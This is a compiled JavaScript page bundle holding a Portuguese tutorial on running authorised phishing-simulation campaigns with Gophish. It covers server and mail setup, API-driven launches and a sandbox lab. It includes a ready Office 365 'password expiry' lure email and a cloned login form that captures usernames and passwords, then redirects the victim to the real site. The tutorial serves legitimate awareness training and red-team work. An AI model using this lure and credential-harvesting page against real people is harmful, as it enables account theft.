import{j as e}from"./index-BofgBnE-.js";import{P as s}from"./PageContainer-B5fVeNJT.js";import{A as i}from"./AlertBox-B_JSQKUS.js";import{C as a}from"./CodeBlock-CaRmq6e3.js";import{C as o}from"./CommandTable-Ck2MUBHP.js";import{T as t,P as r}from"./PracticeBox-BgVTSfiK.js";function u(){return e.jsxs(s,{title:"Gophish — campanhas de phishing controladas",subtitle:"Framework open-source para simular phishing em escala: templates, landing pages, sending profiles, tracking, relatórios.",difficulty:"intermediario",timeToRead:"20 min",children:[e.jsx(i,{type:"danger",title:"Use APENAS com autorização escrita",children:e.jsxs("p",{children:["Gophish foi feito para ",e.jsx("strong",{children:"simulações de awareness"})," contra a própria empresa ou em pentest contratado. Mandar email de phishing para terceiros sem consentimento é crime (Lei 12.737, Marco Civil, LGPD). Toda campanha precisa de scope, RoE e contato do SOC ciente antes do envio."]})}),e.jsx("h2",{children:"O que é"}),e.jsx("p",{children:"Gophish é um servidor Go single-binary que oferece:"}),e.jsxs("ul",{children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Sending Profiles"}),": relays SMTP (Postfix local, SES, SendGrid, Mailgun)."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Email Templates"}),": HTML + variáveis tipo ",e.jsx("code",{children:"{{.FirstName}}"}),", ",e.jsx("code",{children:"{{.URL}}"}),", tracking pixel."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Landing Pages"}),": páginas clonadas (importa de URL ou cola HTML), captura credenciais."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Groups"}),": lista de targets (CSV: email, first_name, last_name, position)."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Campaigns"}),": junção dos itens acima + janela temporal e tracking."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Dashboard + API REST"}),": relatório de quem abriu, clicou, submeteu credenciais, reportou."]})]}),e.jsx("h2",{children:"Instalação"}),e.jsx(t,{path:"~",lines:[{cmd:"wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip",out:"gophish-v0.12.1-linux-64bit.zip   100%[============>]  9.84M   18.4MB/s",outType:"info"},{cmd:"unzip gophish-v0.12.1-linux-64bit.zip -d gophish && cd gophish",out:`Archive: gophish-v0.12.1-linux-64bit.zip
  inflating: gophish/gophish
  inflating: gophish/config.json`,outType:"default"},{cmd:"chmod +x gophish",out:"(silencioso)",outType:"muted"},{cmd:"./gophish",out:`time="2026-04-03T14:08:11" level=info msg="Please login with the username admin and the password 0123456789abcdef"
time="2026-04-03T14:08:11" level=info msg="Starting admin server at https://127.0.0.1:3333"
time="2026-04-03T14:08:11" level=info msg="Starting phishing server at http://0.0.0.0:80"`,outType:"success"}]}),e.jsx("h2",{children:"config.json — o que ajustar"}),e.jsx(a,{language:"json",title:"gophish/config.json (produção em VPS)",code:`{
  "admin_server": {
    "listen_url": "127.0.0.1:3333",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/admin.gophish.lab/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/admin.gophish.lab/privkey.pem"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:443",
    "use_tls": true,
    "cert_path": "/etc/letsencrypt/live/portal.empresa-suporte.com/fullchain.pem",
    "key_path":  "/etc/letsencrypt/live/portal.empresa-suporte.com/privkey.pem"
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_",
  "contact_address": "redteam@empresa.com",
  "logging": {
    "filename": "/var/log/gophish.log",
    "level": "info"
  }
}`}),e.jsx(i,{type:"warning",title:"Painel admin nunca exposto",children:e.jsxs("p",{children:["Mantenha ",e.jsx("code",{children:"admin_server"})," em ",e.jsx("strong",{children:"127.0.0.1"})," e acesse via SSH tunnel: ",e.jsx("code",{children:"ssh -L 3333:127.0.0.1:3333 vps"}),". Painel exposto = world-readable database de credenciais coletadas."]})}),e.jsx("h2",{children:"Sending Profile (SMTP)"}),e.jsx(o,{title:"opções de envio",variations:[{cmd:"Postfix local (VPS)",desc:"Mais barato; requer rDNS, SPF, DKIM, DMARC perfeitos.",output:"Bloqueado por Gmail/O365 sem reputação."},{cmd:"Amazon SES",desc:"Reputação boa; precisa sair do sandbox e justificar uso.",output:"$0.10 / 1000 emails."},{cmd:"SendGrid / Mailgun",desc:"Setup rápido, mas providers detectam phishing patterns.",output:"Conta pode ser banida no meio da campanha."},{cmd:"Office365 dedicado",desc:"Mailbox Office365 com app password, melhor para imitar email corporativo interno.",output:"Útil em RT contra clientes M365."},{cmd:"Smtp gateway com header rewrite",desc:"Postfix em modo relay, reescreve From: e DKIM-sign no domínio do RT.",output:"Para spoof legítimo controlado."}]}),e.jsx(a,{language:"bash",title:"Postfix mínimo p/ Gophish",code:`sudo apt install -y postfix opendkim opendkim-tools
# /etc/postfix/main.cf
myhostname = mail.empresa-suporte.com
mydomain   = empresa-suporte.com
myorigin   = $mydomain
smtpd_tls_cert_file = /etc/letsencrypt/live/mail.empresa-suporte.com/fullchain.pem
smtpd_tls_key_file  = /etc/letsencrypt/live/mail.empresa-suporte.com/privkey.pem
smtpd_use_tls = yes
milter_default_action = accept
smtpd_milters = inet:localhost:8891
non_smtpd_milters = inet:localhost:8891

# DNS record (no registrador):
# v=spf1 mx ip4:203.0.113.45 -all          (SPF)
# default._domainkey ... (DKIM TXT do opendkim-genkey)
# _dmarc  v=DMARC1; p=none; rua=mailto:dmarc@empresa-suporte.com (DMARC)`}),e.jsx("h2",{children:"Email Template"}),e.jsx(a,{language:"html",title:"template: 'Atualizacao Senha O365' (HTML)",code:`<!DOCTYPE html>
<html>
<body style="font-family: Calibri, Arial, sans-serif; color: #323130;">
  <table width="100%" style="max-width:600px; margin:auto;">
    <tr><td style="padding:20px;">
      <img src="https://portal.empresa-suporte.com/static/o365-logo.png" alt="Office 365" />
      <h2>Olá {{.FirstName}},</h2>
      <p>Identificamos uma tentativa de login incomum em sua conta corporativa
         <strong>{{.Email}}</strong> a partir de Moscou (RU) em {{.Date}}.</p>
      <p>Por segurança, sua senha será expirada em <strong>2 horas</strong>.
         Para manter o acesso, valide sua identidade:</p>
      <p>
        <a href="{{.URL}}" style="background:#0078d4; color:#fff; padding:12px 24px;
           text-decoration:none; border-radius:4px;">Validar minha conta</a>
      </p>
      <p style="color:#605e5c; font-size:12px;">Equipe de Segurança · TI</p>
      {{.Tracker}}
    </td></tr>
  </table>
</body>
</html>`}),e.jsx(o,{title:"variáveis de template Gophish",variations:[{cmd:"{{.FirstName}}",desc:"Primeiro nome do target (do CSV).",output:"Alice"},{cmd:"{{.LastName}}",desc:"Sobrenome.",output:"Souza"},{cmd:"{{.Email}}",desc:"Email do target.",output:"alice.souza@cliente.com"},{cmd:"{{.Position}}",desc:"Cargo.",output:"Diretora Financeira"},{cmd:"{{.URL}}",desc:"Link único trackable da landing page.",output:"https://portal.empresa-suporte.com/?rid=Xy7K9"},{cmd:"{{.Tracker}}",desc:"Pixel 1x1 invisível p/ marcar email aberto.",output:"<img ... />"},{cmd:"{{.From}}",desc:"Endereço From: definido no profile.",output:"ti@empresa-suporte.com"},{cmd:"{{.Date}}",desc:"Data atual formatada.",output:"03/04/2026 14:22"}]}),e.jsx("h2",{children:"Landing Page"}),e.jsxs("p",{children:["No painel: ",e.jsx("strong",{children:"Landing Pages → New"}),". Use ",e.jsx("em",{children:"Import Site"}),"para clonar visualmente ",e.jsx("code",{children:"login.microsoftonline.com"}),". Habilite",e.jsx("strong",{children:"Capture Submitted Data"})," e ",e.jsx("strong",{children:"Capture Passwords"}),"(esta última só com aprovação explícita por escrito; muitos contratos proíbem captura clara de senha — usar apenas captura de fato do clique)."]}),e.jsx(a,{language:"html",title:"landing page (trecho injetado)",code:`<form method="POST" action="">
  <input type="email" name="username" placeholder="alguem@empresa.com" required />
  <input type="password" name="password" placeholder="Senha" required />
  <button type="submit">Entrar</button>
</form>

<!-- Após submit, redireciona p/ Office real (vítima nem nota) -->
<script>
document.querySelector('form').addEventListener('submit', function(e){
  setTimeout(()=> window.location='https://login.microsoftonline.com', 600);
});
<\/script>`}),e.jsx("h2",{children:"Group de targets (CSV)"}),e.jsx(a,{language:"bash",title:"targets.csv",code:`First Name,Last Name,Email,Position
Alice,Souza,alice.souza@cliente.com,Diretora Financeira
Bruno,Lima,bruno.lima@cliente.com,Analista de TI
Carla,Mendes,carla.mendes@cliente.com,RH Sr
Daniel,Rocha,daniel.rocha@cliente.com,Estagiario Marketing`}),e.jsx("h2",{children:"Lançar campanha via API"}),e.jsx("p",{children:"Para automação (CI de RT, agendamento mensal):"}),e.jsx(t,{path:"~",lines:[{cmd:"export GOPHISH_API='https://127.0.0.1:3333/api'",out:"(silencioso)",outType:"muted"},{cmd:"export GOPHISH_KEY='abc123...'   # Settings → API Key",out:"(silencioso)",outType:"muted"},{cmd:'curl -k -H "Authorization: Bearer $GOPHISH_KEY" $GOPHISH_API/campaigns/',out:`[
  {"id":1,"name":"Q1-Phish-Awareness","status":"Completed",
   "stats":{"sent":120,"opened":67,"clicked":34,"submitted_data":12,"reported":8}}
]`,outType:"info"},{cmd:`curl -k -H "Authorization: Bearer $GOPHISH_KEY" -X POST $GOPHISH_API/campaigns/ \\
  -d @campaign.json`,out:'{"id":2,"name":"Q2-Phish-Diretoria","status":"In progress","launch_date":"2026-04-03T14:30:00Z"}',outType:"success"}]}),e.jsx(a,{language:"json",title:"campaign.json",code:`{
  "name": "Q2-Phish-Diretoria",
  "template": { "name": "Atualizacao Senha O365" },
  "url": "https://portal.empresa-suporte.com",
  "page": { "name": "O365 Clone v3" },
  "smtp": { "name": "SES Transacional" },
  "launch_date": "2026-04-03T14:30:00Z",
  "send_by_date": "2026-04-03T18:00:00Z",
  "groups": [{ "name": "Diretoria Brasil" }]
}`}),e.jsx("h2",{children:"Dashboard de resultado"}),e.jsx(t,{path:"~",lines:[{comment:"resumo via API após campanha",cmd:`curl -ks -H "Authorization: Bearer $GOPHISH_KEY" $GOPHISH_API/campaigns/1/results | jq '.results | group_by(.status) | map({status: .[0].status, count: length})'`,out:`[
  { "status": "Email Sent",        "count": 120 },
  { "status": "Email Opened",      "count": 67  },
  { "status": "Clicked Link",      "count": 34  },
  { "status": "Submitted Data",    "count": 12  },
  { "status": "Email Reported",    "count": 8   }
]`,outType:"info"}]}),e.jsx(r,{title:"Lab interno: campanha em sandbox isolado",goal:"Subir Gophish em rede privada e mandar campanha para 3 contas de TESTE próprias, validando o fluxo end-to-end sem tocar em pessoas reais.",steps:["Suba Gophish em VM Kali (rede só host-only).","Crie 3 contas Gmail de teste.","Configure SMTP profile usando Gmail app password (Settings → Security → App Passwords).","Crie template básico, landing page que captura email+senha.","Mande campanha pra essas 3 contas, abra os emails, clique, 'submeta'.","Confira no dashboard que os 3 estados foram registrados."],command:`./gophish &
# painel em https://127.0.0.1:3333  user=admin senha=(do log)
# 1. Sending Profile: smtp.gmail.com:587, user/pass
# 2. Template + Landing
# 3. Group com 3 emails de teste
# 4. New Campaign -> Launch`,expected:`Dashboard:
  Sent: 3 / Opened: 3 / Clicked: 3 / Submitted: 3`,verify:"Acesse o painel, clique na campanha, e veja a tabela 'Recent Activity' com 4 eventos por target (Sent → Opened → Clicked → Submitted)."}),e.jsx("h2",{children:"Relatório executivo"}),e.jsx("p",{children:"Após a campanha, o entregável típico ao cliente inclui:"}),e.jsxs("ul",{children:[e.jsx("li",{children:"Métricas (taxa de clique, de submit, de report) comparadas com baseline da indústria (KnowBe4 publica anual)."}),e.jsx("li",{children:"Top 5 setores mais vulneráveis (RH costuma liderar)."}),e.jsx("li",{children:'Recomendações: treinamento, MFA hardware, tag de email externo, banner "External" no Outlook.'}),e.jsxs("li",{children:[e.jsx("strong",{children:"Sem nomear indivíduos"})," em relatório executivo (LGPD + cultura organizacional)."]})]}),e.jsx(i,{type:"info",title:"Alternativas / complementares",children:e.jsxs("p",{children:[e.jsx("strong",{children:"King Phisher"})," (rsmusllp) — bom para campanhas técnicas com payloads anexos.",e.jsx("br",{}),e.jsx("strong",{children:"SET (Social-Engineer Toolkit)"})," — mais antigo, ótimo p/ ataques rápidos com clone single-page.",e.jsx("br",{}),e.jsx("strong",{children:"KnowBe4 / Cofense PhishMe"})," — SaaS comercial com biblioteca enorme de templates e treinamento integrado."]})})]})}export{u as default};
